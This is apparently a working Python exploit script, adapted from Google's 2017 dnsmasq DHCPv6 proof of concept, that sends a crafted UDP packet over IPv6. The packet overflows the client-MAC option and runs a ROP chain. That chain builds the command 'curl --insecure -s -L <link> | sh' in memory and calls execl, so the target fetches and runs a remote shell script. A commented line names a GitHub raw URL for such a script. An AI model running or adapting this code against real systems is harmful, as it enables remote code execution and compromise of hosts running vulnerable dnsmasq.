#!/usr/bin/env python3

# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

import struct
import sys
import socket
#import ray

def p64(x):
  return struct.pack('<Q',x)

def string_split(string_data):
    word_size = 8
    fill_f=b'\xff'
    fill_0=b'\x00'
    sub_list=[]
    for i in range(0, len(string_data), word_size):
        sub_data = string_data[i: i+word_size]
        if len(sub_data) < word_size:
            sub_data += fill_f + fill_0 *(word_size-1-len(sub_data))
        #int_hex=int(sub_data.hex(),16)
        #le = struct.pack('<Q',int_hex)
        #hex_=hex(int(le.hex(),16))
        sub_list.append(sub_data)

    return sub_list

#ray.init(dashboard_host="127.0.0.1")

''' high level function to send data '''
def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))

    # create a socket object for communication
    # AF_INET6 means communicate with IPv6 addresses
    # SOCK_DGRAM dictates that we are communicating with UDP protocol (the protocol for DHCP process)
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))

    # the actuall python function to send data to host/port
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return struct.pack("B", x)

def u16(x):
    return struct.pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])


# on 03 we have mov r8b, r13b and pop r13
'''
records += p64(pop_rdi)
records += p64(bin_sh_string) # bash address
records += p64(ret)
records += p64(system) # system function address
'''
dnsmasq_base = 0x0000000000400000
pop_rax = 0x402288
pop_rdi = 0x43a533 # pop rdi; ret; 
pop_rsi = 0x43a3c4 # pop rsi; ret; 
pop_rdx = 0x403a9d # pop rdx; ret;

pop_rcx = 0x41ac2d # pop rcx; pop rsi; jmp 0x41aa60
#0x41aa60 add rsp,0x118; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

pop_r8  = 0x4257d5 # pop r8; jmp 0x422dd0
# 0x422dd0 xor eax,eax;add rsp,0x178; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

def generate_ret2libc_payload():
    bin_sh_string = 0x7ffff7b943e8
    system = 0x7ffff7a72490

    payload = b'A'*74
    payload += b'B'*8
    payload += p64(pop_rdi)
    payload += p64(bin_sh_string)
    payload += p64(ret)
    payload += p64(system)
    return payload

def generate_ret2plt_payload():
    memcpy_plt = 0x403510
    execl_plt = 0x4284e8
    exit_plt = 0x42850e
    bss = 0x44db80
    # junk = 0x41
    file_link = sys.argv[3]
    bin_sh_loc = bss
    hypen_c_loc = bss + 14
    command_loc = bss + 20


    chars = {
            'a': 0x4496fb,
            'b': 0x449824,
            'c': 0x44a357,
            'd': 0x44a1c8,
            'e': 0x44a49c,
            'f': 0x449d81,
            'g': 0x44b007,
            'h': 0x449fc8,
            'i': 0x448ea9,
            'j': 0x44989e,
            'k': 0x449478,
            'l': 0x44a1cc,
            'm': 0x448aae,
            'n': 0x44a452,
            'o': 0x44ae83,
            'p': 0x44a181,
            'q': 0x44ade9,
            'r': 0x44a374,
            's': 0x44b085,
            't': 0x44a215,
            'u': 0x44b04b,
            'v': 0x44a1fb,
            'w': 0x44a40c,
            'x': 0x44a1d4,
            'y': 0x44a43f,
            'z': 0x449978,
            '0': 0x44a188,
            '1': 0x4485c9,
            '2': 0x4485ed,
            '3': 0x44960b,
            '4': 0x44a494,
            '5': 0x448208,
            '6': 0x4489ed,
            '7': 0x447efe,
            '8': 0x44a185,
            '9': 0x4486e1,
            'L': 0x44a230,
            ':': 0x449ff8,
            ';': 0x44beda,
            ',': 0x449cc0,
            '-': 0x44a42b,
            '+': 0x44a42b,
            '=': 0x448841,
            '/': 0x448f4c,
            ' ': 0x44a18e,
            '|': 0x44a481,
            '.': 0x4493a4,
            '^': 0x44a19a # this will represent a null character
        }

    def paste_char_to_bass(char: str, length: int, bss_write_start: int, offset: int):
        sub_record = b''

        sub_record += p64(pop_rdx)
        sub_record += p64(length)

        sub_record += p64(pop_rsi) # pop rsi addr. (found in connmand executable with ropper)
        sub_record += p64(chars[char]) # char addr.

        sub_record += p64(pop_rdi) # pop rdi addr. (found in connmand executable with ropper)
        sub_record += p64(bss_write_start + offset) # .bss + offset addr.

        sub_record += p64(memcpy_plt) # address to memcpy@plt

        return sub_record


    def paste_string_to_bass(string_data, write_start):
        sub_record = b''

        data_lst = string_split(string_data)

        address_shift = 0
        for x in data_lst:
          sub_record += p64(0x4217fe)  # pop rax; push rax; pop rbx; ret
          #sub_record += p64(0x402288)  # pop rax; ret
          sub_record += x
          sub_record += p64(0x431a03)  # pop rdi; ret 
          sub_record += p64(write_start + address_shift)
          sub_record += p64(0x40effe)  # mov dword ptr [rdi], rax; ret
          address_shift += 8

        return sub_record

    records = b'A'*66

    #shifting payload
    #records += p64(0x402288) #pop rax; ret
    #records += p64(0xdeadbeef)
    for x in range(25):
      records += p64(0x431a04) # ret

    #bin_sh = "/bin/sh^"
    #for i in range(len(bin_sh)):
    #    records += paste_char_to_bass(bin_sh[i], 1, bss, i)
    '''
    records += p64(0x4217fe)  # pop rax; push rax; pop rbx; ret
    records += p64(0x68732f6e69622f)
    records += p64(0x431a03)  # pop rdi; ret 
    records += p64(bss)
    records += p64(0x40effe)  # mov qword ptr [rdi], rax; ret
    '''
    records += paste_string_to_bass(b'/bin/sh\0', bin_sh_loc)

    
    # we begin this write as bss base + 10
    #c_arg = "-c^^"
    #for i in range(len(c_arg)):
    #    records += paste_char_to_bass(c_arg[i], 1, bss + 12, i)

    '''
    records += p64(0x4217fe)  # pop rax; push rax; pop rbx; ret
    records += p64(0xff00632d)
    records += p64(0x431a03)  # pop rdi; ret 
    records += p64(bss + 12)
    records += p64(0x40effe)  # mov dword ptr [rdi], rax; ret
    '''
    records += paste_string_to_bass(b'-c\0', hypen_c_loc)


    # echo = 'curl -s -L https://raw.githubusercontent.com/thegenghiskahn/testingshellwget/main/test.sh | sh^'
    # echo = '/bin/ls^' # '/bin/echo ls | sh^'
    #for i in range(len(echo)):
    #    records += paste_char_to_bass(echo[i], 1, bss + 20, i)
    command_all = "curl --insecure -s -L " + file_link + " | sh\0"
    records += paste_string_to_bass(str.encode(command_all), command_loc)

    records += p64(pop_rdx)
    records += p64(hypen_c_loc)

    # pop rcx; pop rsi; add rsp,0x118; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    records += p64(pop_rcx)
    records += p64(command_loc)   # rcx
    records += p64(bin_sh_loc) # rsi
    records += b'c' *  328

    #records += p64(pop_rsi) # pop rsi address.
    #records += p64(bss)

    records += p64(pop_rdi) # pop rdi addr. (found in connmand executable with ropper)
    records += p64(bin_sh_loc) # address to .bss

    # pop r8 xor eax,eax; add rsp,0x178; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    records += p64(pop_r8)
    records += p64(0x00)
    records += b'c' *  424

    records += p64(execl_plt) # address to execl@plt

    records += p64(exit_plt) # address to exit@plt

    return records


if __name__ == '__main__':

    if len(sys.argv) < 3:
       print("\nUSAGE : " + sys.argv[0] +
                " <IPv6> <Port> <SSH Link>")
       sys.exit()

       #gef_pattern = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa"

    #assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, generate_ret2plt_payload()),
    ])
    # + struct.pack("<Q", 0x1337DEADBEEF) # this was originally in call to gen_option -> (b"A"*74 + this)

    host, port = sys.argv[1], sys.argv[2]
    send_packet(pkg, host, int(port))